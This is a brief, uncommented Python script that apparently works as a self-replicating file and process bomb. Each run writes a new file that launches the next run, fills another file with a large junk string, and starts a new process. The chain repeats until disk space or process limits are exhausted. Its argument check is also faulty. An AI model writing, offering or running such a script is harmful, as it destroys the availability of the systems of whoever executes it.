import sys,os;messege=''.join([chr(i) for i in range(33,33333)])
if sys.argv[1] is None:os.system('python main.py 1')
else:text='import os;os.system(\'python main.py '+str(int(sys.argv[1])+1)+'\')';open(sys.argv[1],'w').write(text);open(str(int(sys.argv[1])-1),'w').write(messege);os.system('python '+sys.argv[1])